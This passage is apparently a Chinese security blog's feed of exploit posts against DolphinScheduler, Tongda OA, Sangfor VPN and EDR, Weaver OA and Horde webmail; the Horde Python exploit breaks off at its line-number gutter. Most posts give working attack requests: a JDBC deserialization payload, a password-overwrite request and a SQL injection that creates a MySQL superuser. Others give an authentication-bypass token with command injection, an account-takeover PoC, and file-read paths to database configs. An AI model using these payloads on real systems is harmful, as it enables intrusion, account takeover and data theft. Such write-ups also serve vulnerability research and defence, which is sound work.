    <content type="html"><![CDATA[<h2 id="Apache-DolphinScheduler组件介绍"><a href="#Apache-DolphinScheduler组件介绍" class="headerlink" title="Apache DolphinScheduler组件介绍"></a>Apache DolphinScheduler组件介绍</h2><p>​    Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1</p><p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.1</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>需要登陆权限</p><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170923674.png" alt="image-20200917170923674"></p><p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170947012.png" alt="image-20200917170947012"></p><p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917171000453.png" alt="image-20200917171000453"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp;</span><br><span class="line">principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>关于MySQL JDBC客户端反序列化漏洞的相关参考：</p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Apache-DolphinScheduler组件介绍&quot;&gt;&lt;a href=&quot;#Apache-DolphinScheduler组件介绍&quot; class=&quot;headerlink&quot; title=&quot;Apache DolphinScheduler组件介绍&quot;&gt;&lt;/a&gt;Apach
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apache" scheme="http://www.ol4three.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/</id>
    <published>2020-09-17T08:56:23.000Z</published>
    <updated>2020-12-01T12:14:10.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码<br>api interface /dolphinscheduler/users/update</p><h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1</p><p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.2</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165719031.png" alt="image-20200917165719031"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;users&#x2F;update</span><br><span class="line">userName&#x3D;admin&amp;userPassword&#x3D;Password1!&amp;tenantId&#x3D;1&amp;email&#x3D;sdluser%40sdluser.sdluser&amp;phone&#x3D;&amp;id&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170117506.png" alt="image-20200917170117506"></p><h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>建议用户将 Apache DolphinScheduler 升级到安全版本。</p><p>下载链接：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码&lt;br&gt;api interface /dolphinsc
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Apache" scheme="http://www.ol4three.com/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>通达OA v11.7 后台SQL注入</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-09-17T08:42:22.000Z</published>
    <updated>2020-12-01T16:23:55.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>需要登录权限</p><p>原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;select%20if((substr(user(),1,1)&#x3D;%27r%27),1,power(9999,99))</span><br></pre></td></tr></table></figure><p>1、添加一个mysql用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165121752.png" alt="image-20200917165121752"></p><p>2、给创建的ateam666账户添加mysql权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;ateam666&#39; AS Binary(5));</span><br></pre></td></tr></table></figure><p>3、刷新数据库就可以登录到数据库啦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;flush privileges;</span><br></pre></td></tr></table></figure><p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;</span><br><span class="line"></span><br><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure><p>5、接下来就是考验mysql提权功底的时候啦 </p><p>参考链接：<a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h2&gt;&lt;p&gt;需要登录权限&lt;/p&gt;
&lt;p&gt;原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服&lt;/p&gt;
&lt;figure c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="通达OA" scheme="http://www.ol4three.com/tags/%E9%80%9A%E8%BE%BEOA/"/>
    
  </entry>
  
  <entry>
    <title>深信服 SSL VPN - Pre Auth 修改绑定手机</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/</id>
    <published>2020-09-17T07:59:22.000Z</published>
    <updated>2020-12-01T16:25:37.407Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞起因："><a href="#漏洞起因：" class="headerlink" title="漏洞起因："></a>漏洞起因：</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160030652.png" alt="image-20200917160030652"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160439482.png" alt="image-20200917160439482"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160456180.png" alt="image-20200917160456180"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;path&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160603185.png" alt="image-20200917160603185"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞起因：&quot;&gt;&lt;a href=&quot;#漏洞起因：&quot; class=&quot;headerlink&quot; title=&quot;漏洞起因：&quot;&gt;&lt;/a&gt;漏洞起因：&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sangfor" scheme="http://www.ol4three.com/tags/sangfor/"/>
    
      <category term="VPN" scheme="http://www.ol4three.com/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>深信服EDR3.2.21 任意代码执行漏洞分析</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-09-17T07:38:47.000Z</published>
    <updated>2020-12-01T16:25:56.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154417360.png" alt="image-20200917154417360"></p><p>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口</p><h3 id="主要调用"><a href="#主要调用" class="headerlink" title="主要调用"></a>主要调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154552300.png" alt="image-20200917154552300"></p><p>跟进</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154605381.png" alt="image-20200917154605381"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以看到 第一个检查为  req_url&#x3D;_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line"></span><br><span class="line">绕过第一个检查:</span><br><span class="line"></span><br><span class="line">在他们系统nginx配置文件里面:</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154713639.png" alt="image-20200917154713639"></p><p><strong>通过</strong>nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问</p><p>/api/edr/sangforinter/v2/xxx 绕过 第一个检查</p><h3 id="第二检查-权限检查"><a href="#第二检查-权限检查" class="headerlink" title="第二检查**:** 权限检查"></a><strong>第二检查**</strong>:** <strong>权限检查</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155137057.png" alt="image-20200917155137057">跟进check_access_token</p><p> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1062563-20200911105704599-1994739155.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里if(md5_str&#x3D;&#x3D;json_token[&quot;md5&quot;]) 引发第二个漏洞: php弱类型导致的漏洞</span><br><span class="line"></span><br><span class="line">绕过只需要传入一个base64编码的json内容为 &#123;“md5”:true&#125;即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>至此**</strong>权限检查绕过完毕**</p><p><strong>来到</strong> process_cssp.php 文件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155330169.png" alt="image-20200917155330169"></p><p>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.</p><p>绕过:{“params”:”w=123&quot;‘1234123’&quot;|命令”}</p><h2 id="结果如下"><a href="#结果如下" class="headerlink" title="结果如下"></a>结果如下</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155504277.png" alt="image-20200917155504277"></p><p>返回：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155558597.png" alt="image-20200917155558597"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/imag
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://www.ol4three.com/categories/WEB/"/>
    
    
      <category term="sangfor" scheme="http://www.ol4three.com/tags/sangfor/"/>
    
      <category term="EDR" scheme="http://www.ol4three.com/tags/EDR/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意用户登陆</title>
    <link href="http://www.ol4three.com/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/"/>
    <id>http://www.ol4three.com/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/</id>
    <published>2020-09-15T01:49:58.000Z</published>
    <updated>2020-12-01T16:24:10.339Z</updated>
    
    <content type="html"><![CDATA[<p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p><p>2、访问 /general/login_code_scan.php 提交 post 参数：</p><p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095052094.png" alt="image-20200915095052094"></p><p>然后构造数据包请求/logincheck_code.php 得到cookie</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095153086.png" alt="image-20200915095153086"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、首先访问 /ispirit/login_code.php 获取 codeuid。&lt;/p&gt;
&lt;p&gt;2、访问 /general/login_code_scan.php 提交 post 参数：&lt;/p&gt;
&lt;p&gt;uid=1&amp;amp;codeuid={9E908086-342B-2
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="通达OA" scheme="http://www.ol4three.com/tags/%E9%80%9A%E8%BE%BEOA/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA云桥任意文件读取和目录遍历漏洞</title>
    <link href="http://www.ol4three.com/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.ol4three.com/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-14T07:05:22.000Z</published>
    <updated>2020-12-01T12:10:48.219Z</updated>
    
    <content type="html"><![CDATA[<p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。</p><p>1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150710482.png" alt="image-20200914150710482"></p><p>2、通过查看文件接口访问 /file/fileNoLogin/id</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150728248.png" alt="image-20200914150728248"></p><p>想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。</p><p>1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。</p><p>2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150903715.png" alt="image-20200914150903715"></p><p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。</p><p>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties</p><p>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150946564.png" alt="image-20200914150946564"></p><p>修复建议:</p><p>关闭程序路由 /file/fileNoLogin</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&amp;gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。&lt;/p&gt;
&lt;p&gt;1、 downloadUrl参数
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="泛微OA" scheme="http://www.ol4three.com/tags/%E6%B3%9B%E5%BE%AEOA/"/>
    
  </entry>
  
  <entry>
    <title>Horde Groupware Webmail Edition 远程命令执行</title>
    <link href="http://www.ol4three.com/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://www.ol4three.com/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-09-14T07:01:58.000Z</published>
    <updated>2020-09-14T07:03:45.339Z</updated>
    
    <content type="html"><![CDATA[<p>Python Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span 